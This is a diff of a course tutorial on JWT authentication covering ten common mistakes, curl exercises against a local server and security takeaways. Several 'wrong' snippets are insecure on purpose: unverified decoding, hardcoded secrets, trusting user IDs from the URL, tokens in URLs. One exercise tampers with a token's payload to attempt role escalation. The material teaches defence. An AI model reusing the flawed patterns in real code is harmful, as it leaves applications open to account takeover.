 ```typescript
-const token = jwt.sign({
-    id: user.id,
-    email: user.email,
-    role: user.role
-}, secret);
+const token = jwt.sign(
+    {
+        id: user.id,
+        email: user.email,
+        role: user.role,
+    },
+    secret
+);
 ```
 
 🎯 **Fix**: Only include non-sensitive identifiers and claims.
@@ -1432,8 +1549,9 @@ const token = jwt.sign({
 ### Mistake 2: Not Checking Token Expiration
 
 ❌ **Wrong**:
+
 ```typescript
-const decoded = jwt.decode(token);  // Just decodes, doesn't verify!
+const decoded = jwt.decode(token); // Just decodes, doesn't verify!
 const userId = decoded.id;
 // Use userId without checking if token is expired or valid
 ```
@@ -1441,6 +1559,7 @@ const userId = decoded.id;
 **Why it's wrong**: `jwt.decode()` doesn't verify the signature or check expiration.
 
 ✅ **Correct** (TCSS-460-auth-squared approach):
+
 ```typescript
 jwt.verify(token, process.env.JWT_SECRET, (error, decoded) => {
     if (error) {
@@ -1457,12 +1576,13 @@ jwt.verify(token, process.env.JWT_SECRET, (error, decoded) => {
 ### Mistake 3: Using Weak or Exposed Secrets
 
 ❌ **Wrong**:
+
 ```typescript
 // Hardcoded in source code
 const token = jwt.sign(payload, 'mysecret');
 
 // Committed to Git
-JWT_SECRET=secret123
+JWT_SECRET = secret123;
 
 // Shared in documentation
 // To run this project, use JWT_SECRET=abc123
@@ -1471,6 +1591,7 @@ JWT_SECRET=secret123
 **Why it's wrong**: If the secret is exposed, anyone can create valid tokens.
 
 ✅ **Correct**:
+
 ```typescript
 // Use environment variable
 const token = jwt.sign(payload, process.env.JWT_SECRET);
@@ -1487,6 +1608,7 @@ JWT_SECRET=8f7a9b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8
 ### Mistake 4: Not Using HTTPS in Production
 
 ❌ **Wrong**:
+
 ```bash
 # Production server running on HTTP
 http://api.example.com/auth/login
@@ -1495,6 +1617,7 @@ http://api.example.com/auth/login
 **Why it's wrong**: JWTs sent over HTTP can be intercepted by anyone on the network.
 
 ✅ **Correct**:
+
 ```bash
 # Production server with HTTPS
 https://api.example.com/auth/login
@@ -1505,6 +1628,7 @@ https://api.example.com/auth/login
 ### Mistake 5: Trusting Client-Provided User IDs
 
 ❌ **Wrong**:
+
 ```typescript
 // Route: DELETE /users/:userId
 static async deleteUser(request: IJwtRequest, response: Response) {
@@ -1518,6 +1642,7 @@ static async deleteUser(request: IJwtRequest, response: Response) {
 **Why it's wrong**: User can manipulate the URL to delete other users.
 
 ✅ **Correct**:
+
 ```typescript
 // Use ID from verified JWT
 static async deleteOwnAccount(request: IJwtRequest, response: Response) {
@@ -1533,6 +1658,7 @@ static async deleteOwnAccount(request: IJwtRequest, response: Response) {
 ### Mistake 6: Not Handling All Token Error Cases
 
 ❌ **Wrong**:
+
 ```typescript
 jwt.verify(token, secret, (error, decoded) => {
     if (error) {
@@ -1545,6 +1671,7 @@ jwt.verify(token, secret, (error, decoded) => {
 **Why it's wrong**: Different errors need different handling for better UX.
 
 ✅ **Correct**:
+
 ```typescript
 jwt.verify(token, secret, (error, decoded) => {
     if (error) {
@@ -1552,7 +1679,7 @@ jwt.verify(token, secret, (error, decoded) => {
             return res.status(401).json({
                 success: false,
                 message: 'Your session has expired. Please log in again.',
-                errorCode: 'TOKEN_EXPIRED'
+                errorCode: 'TOKEN_EXPIRED',
             });
         }
 
@@ -1560,14 +1687,14 @@ jwt.verify(token, secret, (error, decoded) => {
             return res.status(403).json({
                 success: false,
                 message: 'Invalid authentication token.',
-                errorCode: 'TOKEN_INVALID'
+                errorCode: 'TOKEN_INVALID',
             });
         }
 
         return res.status(500).json({
             success: false,
             message: 'Authentication failed.',
-            errorCode: 'AUTH_ERROR'
+            errorCode: 'AUTH_ERROR',
         });
     }
     next();
@@ -1579,20 +1706,22 @@ jwt.verify(token, secret, (error, decoded) => {
 ### Mistake 7: Extremely Long Expiration Times
 
 ❌ **Wrong**:
+
 ```typescript
-jwt.sign(payload, secret, { expiresIn: '365d' })  // 1 year!
+jwt.sign(payload, secret, { expiresIn: '365d' }); // 1 year!
 ```
 
 **Why it's wrong**: If token is stolen, attacker has access for a full year.
 
 ✅ **Correct**:
+
 ```typescript
 // Access token - reasonable expiration
-jwt.sign(payload, secret, { expiresIn: '14d' })  // TCSS-460-auth-squared
+jwt.sign(payload, secret, { expiresIn: '14d' }); // TCSS-460-auth-squared
 
 // Or with refresh tokens
 const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
-const refreshToken = generateRefreshToken(userId);  // Stored in DB
+const refreshToken = generateRefreshToken(userId); // Stored in DB
 ```
 
 🎯 **Fix**: Balance security and UX. Use refresh tokens for long sessions.
@@ -1600,6 +1729,7 @@ const refreshToken = generateRefreshToken(userId);  // Stored in DB
 ### Mistake 8: Not Validating Claims
 
 ❌ **Wrong**:
+
 ```typescript
 // Accept any valid JWT for password reset
 const decoded = jwt.verify(token, secret);
@@ -1609,13 +1739,18 @@ const decoded = jwt.verify(token, secret);
 **Why it's wrong**: User could use an access token to reset passwords.
 
 ✅ **Correct** (TCSS-460-auth-squared approach):
+
 ```typescript
 const decoded = jwt.verify(token, secret);
 
 // Validate token type
 if (decoded.type !== 'password_reset') {
-    return sendError(response, 400, 'Invalid reset token',
-                     ErrorCodes.AUTH_INVALID_TOKEN);
+    return sendError(
+        response,
+        400,
+        'Invalid reset token',
+        ErrorCodes.AUTH_INVALID_TOKEN
+    );
 }
 
 // Proceed with password reset
@@ -1626,6 +1761,7 @@ if (decoded.type !== 'password_reset') {
 ### Mistake 9: Exposing JWT in URLs
 
 ❌ **Wrong**:
+
 ```bash
 # JWT in URL parameter
 https://api.example.com/users?token=eyJhbGci...
@@ -1637,6 +1773,7 @@ https://api.example.com/auth/eyJhbGci.../profile
 **Why it's wrong**: URLs are logged in browser history, server logs, and referrer headers.
 
 ✅ **Correct**:
+
 ```bash
 # JWT in Authorization header
 curl -H "Authorization: Bearer eyJhbGci..." https://api.example.com/users
@@ -1647,15 +1784,17 @@ curl -H "Authorization: Bearer eyJhbGci..." https://api.example.com/users
 ### Mistake 10: Not Using TypeScript Types
 
 ❌ **Wrong** (JavaScript):
+
 ```javascript
 // No type safety
-const userId = request.claims.userId;  // Typo! Should be 'id'
-const userRole = request.claims.permission;  // Wrong property!
+const userId = request.claims.userId; // Typo! Should be 'id'
+const userRole = request.claims.permission; // Wrong property!
 ```
 
 **Why it's wrong**: Typos and property mismatches cause runtime errors.
 
 ✅ **Correct** (TCSS-460-auth-squared TypeScript):
+
 ```typescript
 export interface IJwtClaims {
     id: number;
@@ -1687,6 +1826,7 @@ Practice implementing and testing JWT authentication with these exercises.
 **Objective**: Understand JWT structure by creating and decoding tokens.
 
 **Step 1: Register a new user**
+
 ```bash
 curl -X POST http://localhost:8000/auth/register \
   -H "Content-Type: application/json" \
@@ -1701,6 +1841,7 @@ curl -X POST http://localhost:8000/auth/register \
 ```
 
 **Step 2: Save the JWT from response**
+
 ```json
 {
   "success": true,
@@ -1713,11 +1854,13 @@ curl -X POST http://localhost:8000/auth/register \
 ```
 
 **Step 3: Decode the JWT at https://jwt.io**
+
 - Paste your token into the "Encoded" section
 - Observe the header, payload, and signature
 - Note the `id`, `email`, `role`, `iat`, and `exp` claims
 
 **Questions**:
+
 1. What is the algorithm (`alg`) in the header?
 2. What is your user ID (`id`) in the payload?
 3. When does the token expire? (Use https://www.epochconverter.com to convert `exp` timestamp)
@@ -1727,20 +1870,23 @@ curl -X POST http://localhost:8000/auth/register \
 **Objective**: Understand the difference between authenticated and unauthenticated endpoints.
 
 **Step 1: Test public endpoint (should succeed)**
+
 ```bash
 curl http://localhost:8000/jwt_test
 ```
 
 **Expected Response**:
+
 ```json
 {
-  "message": "Hello World! API is working correctly.",
-  "timestamp": "2024-03-04T10:30:00.000Z",
-  "service": "TCSS-460-auth-squared"
+    "message": "Hello World! API is working correctly.",
+    "timestamp": "2024-03-04T10:30:00.000Z",
+    "service": "TCSS-460-auth-squared"
 }
 ```
 
 **Step 2: Test protected endpoint without JWT (should fail)**
+
 ```bash
 curl -X POST http://localhost:8000/auth/user/password/change \
   -H "Content-Type: application/json" \
@@ -1751,14 +1897,16 @@ curl -X POST http://localhost:8000/auth/user/password/change \
 ```
 
 **Expected Response**:
+
 ```json
 {
-  "success": false,
-  "message": "Auth token is not supplied"
+    "success": false,
+    "message": "Auth token is not supplied"
 }
 ```
 
 **Step 3: Test protected endpoint with JWT (should succeed)**
+
 ```bash
 # Replace YOUR_JWT_HERE with your actual token
 curl -X POST http://localhost:8000/auth/user/password/change \
@@ -1771,6 +1919,7 @@ curl -X POST http://localhost:8000/auth/user/password/change \
 ```
 
 **Questions**:
+
 1. What status code do you get without JWT?
 2. What status code do you get with valid JWT?
 3. Why does the public endpoint not require authentication?
@@ -1782,6 +1931,7 @@ curl -X POST http://localhost:8000/auth/user/password/change \
 **Step 1: Generate a short-lived token (modify code)**
 
 Create a test endpoint in `src/controllers/authController.ts`:
+
 ```typescript
 static async generateShortToken(request: IJwtRequest, response: Response) {
     const token = jwt.sign(
@@ -1795,12 +1945,14 @@ static async generateShortToken(request: IJwtRequest, response: Response) {
 ```
 
 **Step 2: Use the token immediately (should succeed)**
+
 ```bash
 curl -H "Authorization: Bearer YOUR_SHORT_TOKEN" \
      http://localhost:8000/auth/user/password/change
 ```
 
 **Step 3: Wait 31 seconds and try again (should fail)**
+
 ```bash
 # Wait 31 seconds...
 curl -H "Authorization: Bearer YOUR_SHORT_TOKEN" \
@@ -1808,14 +1960,16 @@ curl -H "Authorization: Bearer YOUR_SHORT_TOKEN" \
 ```
 
 **Expected Response**:
+
 ```json
 {
-  "success": false,
-  "message": "Token is not valid"
+    "success": false,
+    "message": "Token is not valid"
 }
 ```
 
 **Questions**:
+
 1. What happens when you use an expired token?
 2. How does the server know the token is expired?
 3. Why does TCSS-460-auth-squared use 14-day expiration instead of 30 seconds?
@@ -1825,6 +1979,7 @@ curl -H "Authorization: Bearer YOUR_SHORT_TOKEN" \
 **Objective**: Understand why signature verification is critical.
 
 **Step 1: Get a valid token from login**
+
 ```bash
 curl -X POST http://localhost:8000/auth/login \
   -H "Content-Type: application/json" \
@@ -1832,25 +1987,29 @@ curl -X POST http://localhost:8000/auth/login \
 ```
 
 **Step 2: Decode the token at jwt.io and modify the payload**
+
 - Change `"id": 123` to `"id": 999`
 - Change `"role": 1` to `"role": 5` (try to become Owner)
 - Copy the resulting "tampered" token
 
 **Step 3: Try to use the tampered token**
+
 ```bash
 curl -H "Authorization: Bearer TAMPERED_TOKEN_HERE" \
      http://localhost:8000/auth/user/password/change
 ```
 
 **Expected Response**:
+
 ```json
 {
-  "success": false,
-  "message": "Token is not valid"
+    "success": false,
+    "message": "Token is not valid"
 }
 ```
 
 **Questions**:
+
 1. Why does the tampered token fail?
 2. What would happen if the server didn't verify the signature?
 3. How does the signature prevent tampering?
@@ -1860,6 +2019,7 @@ curl -H "Authorization: Bearer TAMPERED_TOKEN_HERE" \
 **Objective**: Understand the overhead of JWT compared to session IDs.
 
 **Step 1: Measure JWT size**
+
 ```bash
 # Get your JWT from login response
 JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
@@ -1870,6 +2030,7 @@ echo -n "$JWT" | wc -c
 ```
 
 **Step 2: Compare to a session ID**
+
 ```bash
 # Typical session ID (UUID)
 SESSION_ID="550e8400-e29b-41d4-a716-446655440000"
@@ -1880,6 +2041,7 @@ echo -n "$SESSION_ID" | wc -c
 ```
 
 **Step 3: Calculate overhead per 1000 requests**
+
 ```
 JWT: 250 bytes × 1000 requests = 250 KB
 Session ID: 36 bytes × 1000 requests = 36 KB
@@ -1887,6 +2049,7 @@ Difference: 214 KB per 1000 requests
 ```
 
 **Questions**:
+
 1. Why is JWT larger than a session ID?
 2. What's the trade-off for the extra size?
 3. At what scale does JWT size become a concern?
@@ -1896,6 +2059,7 @@ Difference: 214 KB per 1000 requests
 **Objective**: Build a refresh token system for better security.
 
 **Step 1: Create a refresh token table**
+
 ```sql
 CREATE TABLE refresh_tokens (
     id SERIAL PRIMARY KEY,
@@ -1907,10 +2071,11 @@ CREATE TABLE refresh_tokens (
 ```
 
 **Step 2: Implement refresh token generation**
+
 ```typescript
 export const generateRefreshToken = async (userId: number): Promise<string> => {
     const token = randomUUID();
-    const expiresAt = new Date(Date.now() + 14 * 24 * 60 * 60 * 1000);  // 14 days
+    const expiresAt = new Date(Date.now() + 14 * 24 * 60 * 60 * 1000); // 14 days
 
     await pool.query(
         'INSERT INTO refresh_tokens (account_id, token, expires_at) VALUES ($1, $2, $3)',
@@ -1922,6 +2087,7 @@ export const generateRefreshToken = async (userId: number): Promise<string> => {
 ```
 
 **Step 3: Implement token refresh endpoint**
+
 ```typescript
 static async refreshToken(request: IJwtRequest, response: Response) {
     const { refreshToken } = request.body;
@@ -1949,6 +2115,7 @@ static async refreshToken(request: IJwtRequest, response: Response) {
 ```
 
 **Questions**:
+
 1. Why use both access tokens and refresh tokens?
 2. How does this improve security compared to long-lived access tokens?
 3. What happens when a refresh token is compromised?
@@ -1974,6 +2141,7 @@ curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
 ```
 
 **Questions**:
+
 1. Which formats does TCSS-460-auth-squared accept?
 2. Why is "Authorization: Bearer" the preferred format?
 3. Why should JWTs never be in URLs?
@@ -1985,11 +2153,13 @@ curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
 ### Key Takeaways
 
 🎯 **JWT Structure**: Header.Payload.Signature
+
 - Header defines algorithm
 - Payload contains claims (user data)
 - Signature prevents tampering
 
 🎯 **TCSS-460-auth-squared Implementation**:
+
 - 14-day expiration for access tokens
 - Claims: `id`, `email`, `role`
 - Middleware: `checkToken()` validates all protected routes
@@ -1997,6 +2167,7 @@ curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
 - Validation: `jwt.verify()` in middleware
 
 🎯 **Security Best Practices**:
+
 - Use HTTPS in production
 - Store JWT_SECRET in environment variables
 - Never put sensitive data in payload
@@ -2004,6 +2175,7 @@ curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
 - Use different expiration times for different token types
 
 🎯 **Common Mistakes to Avoid**:
+
 - Using `jwt.decode()` instead of `jwt.verify()`
 - Storing passwords in token payload
 - Exposing JWT_SECRET in code
@@ -2021,6 +2193,7 @@ curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
 ### Further Learning
 
 **Explore the TCSS-460-auth-squared Codebase**:
+
 - **JWT Middleware**: `/src/core/middleware/jwt.ts` - Token validation
 - **Auth Controller**: `/src/controllers/authController.ts` - Login/register
 - **Token Utils**: `/src/core/utilities/tokenUtils.ts` - Token generation
@@ -2028,12 +2201,14 @@ curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
 - **Models**: `/src/core/models/index.ts` - Type definitions
 
 **Deep Dive Resources**:
+
 - **RFC 7519**: Official JWT specification - https://tools.ietf.org/html/rfc7519
 - **JWT.io**: Interactive JWT debugger - https://jwt.io
 - **Auth0 JWT Guide**: Comprehensive JWT documentation - https://auth0.com/docs/tokens/json-web-tokens
 - **OWASP JWT Cheat Sheet**: Security best practices - https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
 
 **Advanced Topics**:
+
 - Refresh tokens and token rotation
 - JWT with RSA/ECDSA signatures (asymmetric cryptography)
 - OAuth 2.0 and OpenID Connect (built on JWT)
